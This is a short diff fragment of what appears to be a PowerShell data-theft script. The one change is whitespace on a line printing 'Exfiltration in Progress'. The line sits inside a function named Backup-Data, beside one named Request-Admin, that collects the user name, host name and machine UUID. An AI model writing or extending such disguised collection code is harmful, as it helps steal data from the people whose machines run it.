@@ -123,7 +123,7 @@ function Request-Admin {
 
 function Backup-Data {
     
-	Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
+    Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
     $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
